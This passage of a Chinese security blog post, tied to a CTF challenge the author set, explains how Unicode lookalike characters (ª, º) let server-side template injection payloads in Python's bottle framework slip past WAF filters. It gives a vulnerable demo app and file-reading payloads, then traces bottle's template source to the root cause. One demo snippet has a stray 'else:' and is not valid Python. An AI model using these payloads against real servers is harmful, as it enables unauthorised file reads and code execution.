@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一段时间之前我在V&amp;N群聊里跟ZianTT和infernity师傅聊bottle SSTI的时候提到过bottle可以通过斜体字进行waf的bypass。这种bypass超模的地方在于它可以直接替换SSTI利用链里的ASCII字符。这激起了我的兴趣，所以我决定往下看看。我目前发现的POC只能">
+<meta property="og:type" content="article">
+<meta property="og:title" content="聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass">
+<meta property="og:url" content="https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="一段时间之前我在V&amp;N群聊里跟ZianTT和infernity师傅聊bottle SSTI的时候提到过bottle可以通过斜体字进行waf的bypass。这种bypass超模的地方在于它可以直接替换SSTI利用链里的ASCII字符。这激起了我的兴趣，所以我决定往下看看。我目前发现的POC只能">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18805019/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18805019/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18805019/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18805019/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18805019/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18805019/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18805019/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18805019/08.png">
+<meta property="article:published_time" content="2025-04-01T14:10:00.000Z">
+<meta property="article:modified_time" content="2025-04-01T14:10:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18805019/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2025-04-14-linecacherce/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2025-03-29-nctf-2025-web-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&text=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&is_video=false&description=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass&body=Check out this article: https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&title=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&name=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-04-01-bottlesstiwaf-bypass/&t=聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Proof-of-Concept-PoC"><span class="toc-number">1.</span> <span class="toc-text">Proof of Concept (PoC)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Root-Cause%EF%BC%88%E5%8E%9F%E7%90%86%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">Root Cause（原理）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9C%E6%96%9C%E4%BD%93%E5%AD%97%E2%80%9D"><span class="toc-number">2.1.</span> <span class="toc-text">什么是“斜体字”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5%E6%96%9C%E4%BD%93%E5%AD%97%E7%AC%A6%EF%BC%9F"><span class="toc-number">2.2.</span> <span class="toc-text">为什么可以输入斜体字符？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%96%9C%E4%BD%93%E5%AD%97%E7%AC%A6%E8%83%BD%E5%A4%9F%E8%A2%AB%E6%AD%A3%E7%A1%AE%E6%89%A7%E8%A1%8C%EF%BC%9F"><span class="toc-number">2.3.</span> <span class="toc-text">为什么斜体字符能够被正确执行？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BC%A0%E5%85%A5%EF%BC%9F"><span class="toc-number">2.4.</span> <span class="toc-text">如何传入？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Special-Tricks-%E7%89%B9%E6%AE%8A%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">Special Tricks (特殊利用)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit-Development-exp"><span class="toc-number">4.</span> <span class="toc-text">Exploit Development (exp)</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-01T14:10:00.000Z" class="dt-published" itemprop="datePublished">2025-04-01</time>
+        
+        (Updated: <time datetime="2025-04-01T14:10:00.000Z" class="dt-updated" itemprop="dateModified">2025-04-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>一段时间之前我在V&amp;N群聊里跟ZianTT和infernity师傅聊bottle SSTI的时候提到过bottle可以通过斜体字进行waf的bypass。这种bypass超模的地方在于它可以直接替换SSTI利用链里的ASCII字符。这激起了我的兴趣，所以我决定往下看看。我目前发现的POC只能替换俩字符，分别是<code>o</code>，<code>a</code>，在bottle的SSTI里，他们可以被直接替换成<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)进而绕过各种waf。在使用场景里此trick相当超模。</p>
+<p>在最近举行的XYCTF 2025里我出了一道相关的题目<code>出题人已疯</code>，那题并不算难题，但确实值得我特地另写一篇文字来解释一下官方题解。</p>
+<p>以下我将聊聊针对斜体字绕过的POC，利用，原理以及一些别的小trick。让我们开始：</p>
+<h1 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h1><p>测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   app.py</span><br><span class="line">@Time    :   2025/03/29 15:52:17</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import bottle</span><br><span class="line">@bottle.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello, World!&#x27;</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    print(payload)</span><br><span class="line">    return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure>
+
+<p>我们对<code>ª</code>进行URL编码，为：<code>%c2%aa</code>，随后删除<code>%c2</code>，只剩下一个<code>%aa</code>，然后替换掉原payload里的<code>a</code>。看以下例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;abs(-1)&#125;&#125;</span><br><span class="line">&#123;&#123;%aabs(-1)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>{{%aabs(-1)}}</code>的<code>print(payload)</code>的结果为：<img src="/images/migrated/18805019/01.png"></p>
+<p>他们的执行结果是一样的。都可以求得<code>-1</code>的绝对值。</p>
+<p><img src="/images/migrated/18805019/02.png"></p>
+<p>同样的，对于字符<code>º</code>，其URL编码后为<code>%c2%ba</code>，有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;open(&#x27;/flag&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;%bapen(&#x27;/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他们的执行结果是一样的。都可以获取<code>/flag</code>文件的内容。</p>
+<p><img src="/images/migrated/18805019/03.png"></p>
+<h1 id="Root-Cause（原理）"><a href="#Root-Cause（原理）" class="headerlink" title="Root Cause（原理）"></a>Root Cause（原理）</h1><h2 id="什么是“斜体字”"><a href="#什么是“斜体字”" class="headerlink" title="什么是“斜体字”"></a>什么是“斜体字”</h2><p>其实使用“斜体字”定义是不严谨的。本文中指的“一个字符的斜体字符集”，主要指的是<code>Decomposition</code>后为同一个字符的字符集。即<a target="_blank" rel="noopener" href="https://www.compart.com/%E4%B8%AD%EF%BC%8C%E5%81%87%E8%AE%BE%E6%88%91%E4%BB%AC%E8%BE%93%E5%85%A5%60%C2%AA%60">https://www.compart.com/中，假设我们输入`ª`</a> (U+00AA)，可以看到：</p>
+<p><img src="/images/migrated/18805019/04.png"></p>
+<p>有这种情况的字符在本文中统称为“字符<code>a</code>的斜体字”。我们可以看到：</p>
+<p><img src="/images/migrated/18805019/05.png"></p>
+<p>这些字符其实<code>Decomposition</code>后均为<code>a</code>，故在本文中都算作“字符<code>a</code>的斜体字”。</p>
+<h2 id="为什么可以输入斜体字符？"><a href="#为什么可以输入斜体字符？" class="headerlink" title="为什么可以输入斜体字符？"></a>为什么可以输入斜体字符？</h2><p>我们直接看bottle.template()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def template(*args, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Get a rendered template as a string iterator.</span><br><span class="line">    You can use a name, a filename or a template string as first parameter.</span><br><span class="line">    Template rendering arguments can be passed as dictionaries</span><br><span class="line">    or directly (as keyword arguments).</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    tpl = args[0] if args else None</span><br><span class="line">    for dictarg in args[1:]:</span><br><span class="line">        kwargs.update(dictarg)</span><br><span class="line">    adapter = kwargs.pop(&#x27;template_adapter&#x27;, SimpleTemplate)</span><br><span class="line">    lookup = kwargs.pop(&#x27;template_lookup&#x27;, TEMPLATE_PATH)</span><br><span class="line">    tplid = (id(lookup), tpl)</span><br><span class="line">    if tplid not in TEMPLATES or DEBUG:</span><br><span class="line">        settings = kwargs.pop(&#x27;template_settings&#x27;, &#123;&#125;)</span><br><span class="line">        if isinstance(tpl, adapter):</span><br><span class="line">            TEMPLATES[tplid] = tpl</span><br><span class="line">            if settings: TEMPLATES[tplid].prepare(**settings)</span><br><span class="line">        elif &quot;\n&quot; in tpl or &quot;&#123;&quot; in tpl or &quot;%&quot; in tpl or &#x27;$&#x27; in tpl:</span><br><span class="line">            TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings)</span><br><span class="line">        else:</span><br><span class="line">            TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings)</span><br><span class="line">    if not TEMPLATES[tplid]:</span><br><span class="line">        abort(500, &#x27;Template (%s) not found&#x27; % tpl)</span><br><span class="line">    return TEMPLATES[tplid].render(kwargs)</span><br></pre></td></tr></table></figure>
+
+<p>当bottle在渲染模板时会先将标识符(<code>{</code>,<code>%</code>,<code>$</code>)识别出来之后做一些整理（prepare之类），随后丢给SimpleTemplate类。使用render()作为渲染的入口函数。我们可以看到源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def render(self, *args, **kwargs):</span><br><span class="line">    &quot;&quot;&quot; Render the template using keyword arguments as local variables. &quot;&quot;&quot;</span><br><span class="line">    env = &#123;&#125;</span><br><span class="line">    stdout = []</span><br><span class="line">    for dictarg in args:</span><br><span class="line">        env.update(dictarg)</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    self.execute(stdout, env)</span><br><span class="line">    return &#x27;&#x27;.join(stdout)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到就是update了一些变量之后，进入了self.execute，我们跟进：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def execute(self, _stdout, kwargs):</span><br><span class="line">    env = self.defaults.copy()</span><br><span class="line">    env.update(kwargs)</span><br><span class="line">    env.update(&#123;</span><br><span class="line">        &#x27;_stdout&#x27;: _stdout,</span><br><span class="line">        &#x27;_printlist&#x27;: _stdout.extend,</span><br><span class="line">        &#x27;include&#x27;: functools.partial(self._include, env),</span><br><span class="line">        &#x27;rebase&#x27;: functools.partial(self._rebase, env),</span><br><span class="line">        &#x27;_rebase&#x27;: None,</span><br><span class="line">        &#x27;_str&#x27;: self._str,</span><br><span class="line">        &#x27;_escape&#x27;: self._escape,</span><br><span class="line">        &#x27;get&#x27;: env.get,</span><br><span class="line">        &#x27;setdefault&#x27;: env.setdefault,</span><br><span class="line">        &#x27;defined&#x27;: env.__contains__</span><br><span class="line">    &#125;)</span><br><span class="line">    exec(self.co, env)</span><br><span class="line">    if env.get(&#x27;_rebase&#x27;):</span><br><span class="line">        subtpl, rargs = env.pop(&#x27;_rebase&#x27;)</span><br><span class="line">        rargs[&#x27;base&#x27;] = &#x27;&#x27;.join(_stdout)  #copy stdout</span><br><span class="line">        del _stdout[:]  # clear stdout</span><br><span class="line">        return self._include(env, subtpl, **rargs)</span><br><span class="line">    return env</span><br></pre></td></tr></table></figure>
+
+<p>可以看到包含有<code>exec(self.co, env)</code>说明模板代码的执行在这个函数里。可以看到在exec的全局变量里定义了一个<code>_escape</code>和<code>_printlist</code>函数。</p>
+<p>我们接着看，这个exec函数的第一个参数（即执行的代码）是<code>self.co</code>，源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@cached_property</span><br><span class="line">def co(self):</span><br><span class="line">    return compile(self.code, self.filename or &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>compile了<code>self.code</code>，我们接着跟进（这个<code>@cached_property</code>可以理解为是一个优化机制，用来避免重复计算，不必在意）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@cached_property</span><br><span class="line">def code(self):</span><br><span class="line">    source = self.source</span><br><span class="line">    if not source:</span><br><span class="line">        with open(self.filename, &#x27;rb&#x27;) as f:</span><br><span class="line">            source = f.read()</span><br><span class="line">    try:</span><br><span class="line">        source, encoding = touni(source), &#x27;utf8&#x27;</span><br><span class="line">    except UnicodeError:</span><br><span class="line">        raise depr(0, 11, &#x27;Unsupported template encodings.&#x27;, &#x27;Use utf-8 for templates.&#x27;)</span><br><span class="line">    parser = StplParser(source, encoding=encoding, syntax=self.syntax)</span><br><span class="line">    code = parser.translate()</span><br><span class="line">    self.encoding = parser.encoding</span><br><span class="line">    return code</span><br></pre></td></tr></table></figure>
+
+<p>我们在try处插个print，然后随便渲染点东西看看，比如<code>{{hello world}}</code>，测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import bottle</span><br><span class="line">@bottle.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello, World!&#x27;</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18805019/06.png"></p>
+<p>可以看到这个source就是我们的输入。在<code>try</code>语句中进行了一次touni()我们来看看逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def touni(s, enc=&#x27;utf8&#x27;, err=&#x27;strict&#x27;):</span><br><span class="line">    if isinstance(s, bytes):</span><br><span class="line">        return s.decode(enc, err)</span><br><span class="line">    return unicode(&quot;&quot; if s is None else s)</span><br></pre></td></tr></table></figure>
+
+<p>这个unicode的定义（python3）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicode = str</span><br></pre></td></tr></table></figure>
+
+<p>也就是说unicode就是全体str，所以这一步对于我们的斜体字来说不影响。</p>
+<p>接着看<code>self.code</code>，try语句结束之后实例化了一个<code>StplParser</code>类，我们来看看所调用的<code>translate()</code>方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def translate(self):</span><br><span class="line">    if self.offset: raise RuntimeError(&#x27;Parser is a one time instance.&#x27;)</span><br><span class="line">    while True:</span><br><span class="line">        m = self.re_split.search(self.source, pos=self.offset)</span><br><span class="line">        if m:</span><br><span class="line">            text = self.source[self.offset:m.start()]</span><br><span class="line">            self.text_buffer.append(text)</span><br><span class="line">            self.offset = m.end()</span><br><span class="line">            if m.group(1):  # Escape syntax</span><br><span class="line">                line, sep, _ = self.source[self.offset:].partition(&#x27;\n&#x27;)</span><br><span class="line">                self.text_buffer.append(self.source[m.start():m.start(1)] +</span><br><span class="line">                                        m.group(2) + line + sep)</span><br><span class="line">                self.offset += len(line + sep)</span><br><span class="line">                continue</span><br><span class="line">            self.flush_text()</span><br><span class="line">            self.offset += self.read_code(self.source[self.offset:],</span><br><span class="line">                                          multiline=bool(m.group(4)))</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    self.text_buffer.append(self.source[self.offset:])</span><br><span class="line">    self.flush_text()</span><br><span class="line">    return &#x27;&#x27;.join(self.code_buffer)</span><br></pre></td></tr></table></figure>
+
+<p>解析了我们的模板。本文中我们只关注该代码块中调用的<code>self.flush_text()</code>函数。我们来看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def flush_text(self):</span><br><span class="line">    text = &#x27;&#x27;.join(self.text_buffer)</span><br><span class="line">    del self.text_buffer[:]</span><br><span class="line">    if not text: return</span><br><span class="line">    parts, pos, nl = [], 0, &#x27;\\\n&#x27; + &#x27;  &#x27; * self.indent</span><br><span class="line">    for m in self.re_inl.finditer(text):</span><br><span class="line">        prefix, pos = text[pos:m.start()], m.end()</span><br><span class="line">        if prefix:</span><br><span class="line">            parts.append(nl.join(map(repr, prefix.splitlines(True))))</span><br><span class="line">        if prefix.endswith(&#x27;\n&#x27;): parts[-1] += nl</span><br><span class="line">        parts.append(self.process_inline(m.group(1).strip()))</span><br><span class="line">    if pos &lt; len(text):</span><br><span class="line">        prefix = text[pos:]</span><br><span class="line">        lines = prefix.splitlines(True)</span><br><span class="line">        if lines[-1].endswith(&#x27;\\\\\n&#x27;): lines[-1] = lines[-1][:-3]</span><br><span class="line">        elif lines[-1].endswith(&#x27;\\\\\r\n&#x27;): lines[-1] = lines[-1][:-4]</span><br><span class="line">        parts.append(nl.join(map(repr, lines)))</span><br><span class="line">    code = &#x27;_printlist((%s,))&#x27; % &#x27;, &#x27;.join(parts)</span><br><span class="line">    self.lineno += code.count(&#x27;\n&#x27;) + 1</span><br><span class="line">    self.write_code(code)</span><br></pre></td></tr></table></figure>
+
+<p>解释一下就是，他会把我们的代码块规范化了一下。并调用了一些exec全局空间里的内置函数（比如<code>_printlist</code>）假设我们的模板是<code>hello {{hello world}}</code></p>
+<p>经过<code>translate()</code>后变为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_printlist((&#x27;hello &#x27;, _escape(hello world),))</span><br></pre></td></tr></table></figure>
+
